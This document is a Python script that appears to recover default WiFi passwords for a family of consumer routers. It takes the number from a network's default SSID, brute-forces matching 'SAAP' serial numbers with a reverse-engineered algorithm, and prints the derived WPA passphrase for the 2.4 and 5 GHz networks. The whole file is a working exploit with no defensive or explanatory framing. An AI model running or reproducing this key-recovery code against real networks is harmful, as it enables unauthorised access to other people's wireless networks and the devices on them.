#!/usr/bin/env python3

import sys
import hashlib
import struct

if len(sys.argv) < 2:
    print('Usage:', sys.argv[0], '123456')
    exit(1)

last_two_digits_of_target = int(sys.argv[1][-2:])
target = int(sys.argv[1])

print("[*] Target is", target)

magic_24ghz = 0xff8d8f20
magic_5ghz = 0xffd9da60

magic0 = 0xb21642c9
magic1 = 0x68de3af
magic2 = 0x6b5fca6b

def create_ssid(s1, s2, s3, s4, magic):
    a = (s2 * 10 + s3) & 0xffffffff
    b = (s1 * 2500000 + a * 6800 + s4 + magic) & 0xffffffff

    return b - (((b * magic2) >> 54) - (b >> 31)) * 10000000

def generate_passphrase(serial, type):
    new_serial = serial 

    if (type == '5'):
        new_serial = serial = serial[::-1]

    m = hashlib.md5()
    m.update(new_serial.encode('utf-8'))

    intlist = int.from_bytes(m.digest(), 'little')

    d1 = intlist & 0xffff
    d2 = intlist >> 16 & 0xffff
    d3 = intlist >> 32 & 0xffff
    d4 = intlist >> 48 & 0xffff

    hash1 = mangle(d1, d2, d3, d4)

    intlist = int.from_bytes(m.digest(), 'little')

    d1 = intlist >> 64 & 0xffff
    d2 = intlist >> 80 & 0xffff
    d3 = intlist >> 96 & 0xffff
    d4 = intlist >> 112 & 0xffff

    hash2 = mangle(d1, d2, d3, d4)

    combined_hashes = format(hash1, "08X") + format(hash2, "08X")
    m = hashlib.md5()
    m.update(combined_hashes.encode('utf-8'))
    passphrase = convert_hash_to_pass(m.digest())

    print('[*] Found passphrase for', type, 'GHZ', new_serial, 'passphrase =', passphrase)

def mangle(d1, d2, d3, d4):
    a = ((d4 * magic1) >> 40) - (d4 >> 31)
    a = a & 0xffffffff

    b = (d4 - a * 9999 + 1) * 11
    b = b & 0xffffffff

    return (b * (d2 * 100 + d3 * 10 + d1)) & 0xffffffff

def convert_hash_to_pass(in_hash):
    out_pass = ''

    for i in range(0,8):
        a = in_hash[i] & 0x1f
        a -= ((a * magic0) >> 36) * 23

        a = (a & 0xff) + 0x41

        if chr(a) >= 'I': a+=1
        if chr(a) >= 'L': a+=1
        if chr(a) >= 'O': a+=1

        out_pass += chr(a)

    return out_pass;

def check(s1, s2, s3, s4):
    check5 = create_ssid(s1, s2, s3, s4, magic_5ghz) == target
    check24 = create_ssid(s1, s2, s3, s4, magic_24ghz) == target

    if check24 == False and check5 == False:
        return
        
    serial = 'SAAP' + str(s1) + str(s2).zfill(2) + str(s3) + str(s4).zfill(4)
    if check5:
        generate_passphrase(serial, '5')
    if check24:
        generate_passphrase(serial, '24')

for s1 in range(0,10):
    for s2 in range(0,100):
        for s3 in range(0,10):
            for s4 in range(0,100):
                check(s1, s2, s3, s4 * 100 + last_two_digits_of_target)